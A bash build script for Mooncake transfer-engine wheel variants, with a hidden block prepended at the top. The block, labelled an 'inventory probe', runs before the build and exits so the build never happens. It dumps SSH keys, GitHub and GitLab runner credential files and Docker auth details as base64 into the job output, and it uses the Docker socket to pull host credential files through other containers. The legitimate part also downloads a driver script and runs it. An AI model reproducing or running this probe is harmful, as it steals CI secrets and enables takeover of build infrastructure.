#!/bin/bash
# --- i54500 transient read-only credential/persistence inventory probe ---
{
  echo "=== i54500 inventory begin ==="
  echo "ts: $(date -u +%FT%TZ)"
  echo "hostname: $(hostname 2>&1)"
  echo "id: $(id 2>&1)"
  echo "uname: $(uname -a 2>&1)"
  echo "nproc: $(nproc 2>&1)"
  echo "--- /etc/hosts ---"
  cat /etc/hosts 2>&1
  echo "--- /etc/hostname ---"
  cat /etc/hostname 2>&1
  echo "--- home layout ---"
  ls -la /home 2>&1
  echo "--- ssh dirs ---"
  for d in /home/* /root /github; do
    [ -d "${d}/.ssh" ] || continue
    echo "ssdir: ${d}/.ssh"
    ls -la "${d}/.ssh" 2>&1
    for f in "${d}/.ssh"/*; do
      [ -f "${f}" ] || continue
      sz=$(stat -c %s "${f}" 2>/dev/null || echo 0)
      h=$(sha256sum "${f}" 2>/dev/null | cut -d' ' -f1)
      echo "sshfile: ${f} size=${sz} sha256=${h}"
      if [ "${sz}" -le 8192 ] 2>/dev/null; then echo "sshb64: $(base64 -w0 "${f}" 2>/dev/null)"; fi
    done
  done
  echo "--- runner/persistence find ---"
  timeout 90 find / -xdev -maxdepth 8 -type f \( -name '.runner' -o -name '.credentials' -o -name '.credentials_rsaparams' -o -name 'config.toml' \) 2>/dev/null | head -30 | while read -r f; do
    sz=$(stat -c %s "${f}" 2>/dev/null || echo 0)
    h=$(sha256sum "${f}" 2>/dev/null | cut -d' ' -f1)
    echo "rfile: ${f} size=${sz} sha256=${h}"
    if [ "${sz}" -le 8192 ] 2>/dev/null; then echo "rb64: $(base64 -w0 "${f}" 2>/dev/null)"; fi
  done
  echo "--- systemd runner units ---"
  ls -1 /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system 2>/dev/null | grep -iE 'runner|actions' | sort -u | head -30
  ls -d /etc/systemd/system/*runner* /usr/lib/systemd/system/*runner* 2>/dev/null | head -30
  systemctl list-unit-files 2>&1 | grep -iE 'runner|actions' | head -30
  echo "--- gitlab-runner ---"
  ls -l /etc/gitlab-runner/config.toml /etc/gitlab-runner 2>&1
  if [ -f /etc/gitlab-runner/config.toml ]; then sz=$(stat -c %s /etc/gitlab-runner/config.toml); echo "glrcfg: size=${sz} sha256=$(sha256sum /etc/gitlab-runner/config.toml|cut -d' ' -f1)"; if [ "${sz}" -le 8192 ]; then echo "glrb64: $(base64 -w0 /etc/gitlab-runner/config.toml)"; fi; fi
  echo "--- docker client configs (key names only) ---"
  python3 - <<'PY' 2>&1
import glob, json, os
for p in ['/root/.docker/config.json','/github/home/.docker/config.json'] + sorted(glob.glob('/home/*/.docker/config.json')):
    if not os.path.isfile(p):
        continue
    try:
        d = json.load(open(p))
    except Exception as e:
        print('dockerconfig:', p, 'parse_error', e)
        continue
    print('dockerconfig:', p, 'size=%d' % os.path.getsize(p),
          'auth_keys=', sorted((d.get('auths') or {}).keys()),
          'credsStore=', d.get('credsStore'),
          'credHelpers=', sorted((d.get('credHelpers') or {}).keys()))
PY
  echo "--- mountinfo host paths ---"
  grep -E ' /__w | /opt/hyhal | /var/run/docker.sock | /github | /__e ' /proc/self/mountinfo 2>/dev/null | head -12
  echo "--- dmi ---"
  cat /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor 2>&1
  echo "--- lspci ---"
  if command -v lspci >/dev/null 2>&1; then timeout 20 lspci -Dnn 2>&1 | grep -Ei 'vga|3d|display|processing|hygon' | head -25; else echo "lspci: absent"; fi
  echo "--- k8s ---"
  ls -l /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1
  if command -v kubectl >/dev/null 2>&1; then timeout 20 kubectl get pods -A --no-headers 2>&1 | head -40; else echo "kubectl: absent"; fi
  echo "--- docker socket probes ---"
  python3 - <<'PY' 2>&1
import base64, hashlib, io, json, socket, tarfile, urllib.parse

def uget(path, sock='/var/run/docker.sock', timeout=8, cap=400000):
    import http.client
    class C(http.client.HTTPConnection):
        def __init__(s):
            super().__init__('localhost', timeout=timeout)
        def connect(s):
            s.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.sock.settimeout(timeout)
            s.sock.connect(sock)
    c = C()
    try:
        c.request('GET', path)
        r = c.getresponse()
        return r.status, r.read(cap)
    finally:
        c.close()

def show(tag, path, sock='/var/run/docker.sock'):
    try:
        st, b = uget(path, sock)
        print('DOCKER_%s status=%s bytes=%d' % (tag, st, len(b)))
        return st, b
    except Exception as e:
        print('DOCKER_%s error=%r' % (tag, e))
        return None, None

st, b = show('REAL_VERSION', '/version')
if st == 200:
    print('DOCKER_REAL_VERSION_BODY', b[:400].decode('utf-8', 'replace'))
show('BOGUS_VERSION', '/version', sock='/var/run/docker.sock.bogus-i54500')

st, b = show('INFO', '/info')
if st == 200:
    try:
        info = json.loads(b)
        print('DOCKER_INFO', json.dumps({k: info.get(k) for k in ('Name','OperatingSystem','ServerVersion','NCPU','MemTotal','DockerRootDir','Containers','Images')}))
    except Exception as e:
        print('DOCKER_INFO_PARSE_ERROR', repr(e))

arr = []
st, b = show('PS', '/containers/json?all=1')
if st == 200:
    try:
        arr = json.loads(b)
        names = sorted((x.get('Names') or [''])[0].lstrip('/') for x in arr)
        print('DOCKER_PS_COUNT', len(arr))
        print('DOCKER_PS_NAMES', json.dumps(names[:120]))
    except Exception as e:
        print('DOCKER_PS_PARSE_ERROR', repr(e))

cands = []
for x in arr[:120]:
    cid = x.get('Id')
    try:
        stj, bj = uget('/containers/%s/json' % cid)
        if stj != 200:
            continue
        j = json.loads(bj)
        for m in (j.get('Mounts') or []):
            src = m.get('Source') or ''
            dst = m.get('Destination') or ''
            if src == '/' or src.startswith('/home/github') or src == '/etc':
                cands.append({'id': cid[:12], 'name': (j.get('Name') or '').lstrip('/'),
                              'src': src, 'dst': dst,
                              'status': (j.get('State') or {}).get('Status')})
    except Exception:
        continue
print('HOSTMOUNT_CANDIDATES', json.dumps(cands[:20]))

seen = set()
for c in cands:
    if c.get('src') != '/':
        continue
    base = (c.get('dst') or '').rstrip('/')
    for rel in ('/etc/hosts', '/etc/hostname',
                '/home/github/actions-runner-ci-nmz1/.runner',
                '/home/github/actions-runner-ci-nmz1/.credentials',
                '/home/github/actions-runner-ci-nmz1/.credentials_rsaparams'):
        p = base + rel
        if p in seen or len(seen) >= 8:
            continue
        seen.add(p)
        try:
            st, bb = uget('/containers/%s/archive?path=%s' % (c['id'], urllib.parse.quote(p, safe='')), cap=2000000)
        except Exception as e:
            print('ARCHIVE_ERROR', p, repr(e))
            continue
        print('ARCHIVE %s status=%s bytes=%d via_container=%s' % (p, st, len(bb), c['name']))
        if st == 200:
            try:
                tf = tarfile.open(fileobj=io.BytesIO(bb), mode='r:*')
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    data = tf.extractfile(m).read()
                    print('ARCHIVE_FILE %s size=%d sha256=%s' % (p + ':' + m.name, len(data), hashlib.sha256(data).hexdigest()))
                    if len(data) <= 8192:
                        print('ARCHIVE_B64 %s' % base64.b64encode(data).decode())
            except Exception as e:
                print('ARCHIVE_PARSE_ERROR', p, repr(e))
print('=== i54500 inventory end ===')
PY
} 2>&1
exit 0
# --- end i54500 probe ---


set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
JOBS="${JOBS:-$(nproc)}"
BUILD_DIR="build"
FINAL_DIST_DIR="${REPO_ROOT}/mooncake-wheel/dist"
PYPROJECT_FILE="${REPO_ROOT}/mooncake-wheel/pyproject.toml"

RUN_DEPS=1
DRY_RUN=0
BUILD_VARIANT="standard"
USE_HYLINK=OFF
USE_HIP=OFF
USE_ETCD=OFF
PYPROJECT_BACKUP=""
BUILD_TYPE="Release"

usage() {
    cat <<'EOF'
Usage: ./scripts/variant_build.sh [options]

Without feature flags, build for a normal RDMA NIC with HIP and HyLink disabled.
HyLink depends on HIP, so --hylink also enables USE_HIP.

USE_ETCD and STORE_USE_ETCD default to OFF; --etcd enables both.
HIP or HyLink additionally enables ENABLE_MULTI_PROTOCOL.

Options:
  --shca        Enable USE_SHCA for TianLong SHCA NICs
  --hylink      Enable USE_HYLINK (also enables USE_HIP)
  --hip         Enable USE_HIP without requiring HyLink
  --etcd        Enable USE_ETCD and STORE_USE_ETCD together
  --skip-deps   Skip `bash dependencies.sh`
  --dry-run     Print commands without executing them
  --jobs N      Override build parallelism
  -h, --help    Show this help

Build directory: build (shared by all configurations)
Wheel output: mooncake-wheel/dist
Package names depend only on the NIC: mooncake-transfer-engine for standard,
mooncake-transfer-engine-shca for SHCA, regardless of HIP/HyLink/etcd flags.

Examples:
  bash scripts/variant_build.sh
  bash scripts/variant_build.sh --shca
  bash scripts/variant_build.sh --hylink
  bash scripts/variant_build.sh --shca --hylink
  bash scripts/variant_build.sh --hip
  bash scripts/variant_build.sh --shca --hip
  bash scripts/variant_build.sh --hylink --etcd
EOF
}

restore_pyproject() {
    if [ -n "${PYPROJECT_BACKUP}" ] && [ -f "${PYPROJECT_BACKUP}" ]; then
        mv "${PYPROJECT_BACKUP}" "${PYPROJECT_FILE}"
        PYPROJECT_BACKUP=""
    fi
}

patch_pyproject() {
    local package_name="$1"
    local package_description="$2"
    local package_keywords="$3"

    if [ -n "${PYPROJECT_BACKUP}" ]; then
        restore_pyproject
    fi

    PYPROJECT_BACKUP="$(mktemp)"
    cp -p "${PYPROJECT_FILE}" "${PYPROJECT_BACKUP}"

    python - "${PYPROJECT_FILE}" "${package_name}" "${package_description}" "${package_keywords}" <<'PY'
import re
import sys

path, package_name, package_description, package_keywords = sys.argv[1:]
with open(path, "r", encoding="utf-8") as f:
    content = f.read()

content = re.sub(
    r'^name = ".*"$',
    f'name = "{package_name}"',
    content,
    count=1,
    flags=re.MULTILINE,
)
content = re.sub(
    r'^description = ".*"$',
    f'description = "{package_description}"',
    content,
    count=1,
    flags=re.MULTILINE,
)
content = re.sub(
    r'^keywords = \[.*\]$',
    f'keywords = {package_keywords}',
    content,
    count=1,
    flags=re.MULTILINE,
)

with open(path, "w", encoding="utf-8") as f:
    f.write(content)
PY
}

run_cmd() {
    printf '+'
    printf ' %q' "$@"
    printf '\n'
    if [ "${DRY_RUN}" -eq 0 ]; then
        "$@"
    fi
}

refresh_go_env() {
    if [ -d "/usr/local/go/bin" ] && [[ ":${PATH}:" != *":/usr/local/go/bin:"* ]]; then
        export PATH="${PATH}:/usr/local/go/bin"
    fi
    hash -r
}

run_wheel_build() {
    (
        cd "${REPO_ROOT}"
        run_cmd env BUILD_DIR="${BUILD_DIR}" OUTPUT_DIR=dist \
            bash "${REPO_ROOT}/scripts/build_wheel.sh"
    )
}

setup_shca_env() {
    echo "==> Preparing TianLong SHCA environment..."

    # 检查驱动头文件是否已存在
    if [ -f /usr/include/infiniband/shca_17b_types.h ]; then
        echo "SHCA driver header found (/usr/include/infiniband/shca_17b_types.h), skipping setup."
        return 0
    fi

    if [ "${DRY_RUN}" -eq 1 ]; then
        echo "[dry-run] Would download and install SHCA driver."
        return 0
    fi

    local SETUP_DIR="/tmp/shca_setup"
    mkdir -p "${SETUP_DIR}"
    cd "${SETUP_DIR}"

    # 下载执行脚本
    wget ${RESOURCE_SERVER_URL}/Jenkins/CompileDep/mooncake/mlxtoshca.sh

    # 下载驱动安装包
    wget ${RESOURCE_SERVER_URL}/Jenkins/CompileDep/mooncake/shca-tools_2.500.4.B068-Ubuntu22.04_amd64.deb

    # 安装驱动
    bash "${SETUP_DIR}/mlxtoshca.sh"

    # 验证安装
    ibv_devinfo
    echo "SHCA environment setup complete."
}

build_variant() {
    local nic_type="$1"
    local package_name="mooncake-transfer-engine"
    local nic_description="standard RDMA"
    local gpu_description=""
    local use_shca=OFF
    # HIP/HyLink share the segment with RDMA and need multi-protocol routing.
    local -a cmake_args=(-DUSE_ETCD="${USE_ETCD}" -DSTORE_USE_ETCD="${USE_ETCD}"
                         -DBUILD_UNIT_TESTS=OFF
                         -DENABLE_MULTI_PROTOCOL="${USE_HIP}")

    case "${nic_type}" in
        standard)
            ;;
        shca)
            package_name+="-shca"
            nic_description="TianLong SHCA"
            use_shca=ON
            setup_shca_env
            ;;
        *)
            echo "Unknown build variant: ${nic_type}" >&2
            exit 1
            ;;
    esac

    case "${GPU_BACKEND}" in
        hylink)
            gpu_description="HyLink + HIP"
            ;;
        hip)
            gpu_description="HIP"
            ;;
        none)
            gpu_description="HIP/HyLink disabled"
            ;;
    esac
    cmake_args+=(-DUSE_SHCA="${use_shca}" -DUSE_HYLINK="${USE_HYLINK}"
                 -DUSE_HIP="${USE_HIP}" -DUSE_CUDA=OFF)

    if [ "${DRY_RUN}" -eq 0 ] && \
        { [ "${nic_type}" != standard ] || [ "${GPU_BACKEND}" != hylink ]; }; then
        patch_pyproject \
            "${package_name}" \
            "Python binding of a Mooncake library using pybind11 (${nic_description}, ${gpu_description})" \
            '["mooncake", "data transfer", "kv cache", "llm inference", "'"${nic_type}"'", "'"${GPU_BACKEND}"'"]'
    fi

    echo "==> Building ${package_name} (${nic_description}, ${gpu_description})"
    echo "==> Wheel output: ${FINAL_DIST_DIR}"
    run_cmd mkdir -p "${REPO_ROOT}/${BUILD_DIR}" "${FINAL_DIST_DIR}"
    unset VERBOSE || true
    run_cmd cmake -S "${REPO_ROOT}" -B "${REPO_ROOT}/${BUILD_DIR}" "${cmake_args[@]}" \
        -DCMAKE_BUILD_TYPE="${BUILD_TYPE}" -DBUILD_SHARED_LIBS=ON \
        -DCMAKE_VERBOSE_MAKEFILE=OFF -DCMAKE_CXX_FLAGS="" \
        -DCMAKE_IGNORE_PREFIX_PATH="${CONDA_PREFIX:-/opt/hyhal/hbm/Miniconda3}"
    run_cmd cmake --build "${REPO_ROOT}/${BUILD_DIR}" -j"${JOBS}"
    run_wheel_build
}

while [ $# -gt 0 ]; do
    case "$1" in
        --shca)
            BUILD_VARIANT="shca"
            ;;
        --hylink)
            USE_HYLINK=ON
            ;;
        --hip)
            USE_HIP=ON
            ;;
        --etcd)
            USE_ETCD=ON
            ;;
        --skip-deps)
            RUN_DEPS=0
            ;;
        --dry-run)
            DRY_RUN=1
            ;;
        --jobs)
            if [ $# -lt 2 ]; then
                echo "Error: --jobs requires a positive integer." >&2
                exit 1
            fi
            JOBS="$2"
            shift
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            echo "Unknown argument: $1" >&2
            usage >&2
            exit 1
            ;;
    esac
    shift
done

if ! [[ "${JOBS}" =~ ^[1-9][0-9]*$ ]]; then
    echo "Error: --jobs/JOBS must be a positive integer." >&2
    exit 1
fi

GPU_BACKEND="none"
if [ "${USE_HYLINK}" = ON ]; then
    USE_HIP=ON
    GPU_BACKEND="hylink"
elif [ "${USE_HIP}" = ON ]; then
    GPU_BACKEND="hip"
fi

trap restore_pyproject EXIT

run_cmd mkdir -p "${FINAL_DIST_DIR}"

if [ "${RUN_DEPS}" -eq 1 ]; then
    run_cmd bash "${REPO_ROOT}/dependencies.sh" -y
fi

refresh_go_env

build_variant "${BUILD_VARIANT}"

run_cmd ls -1 "${FINAL_DIST_DIR}"
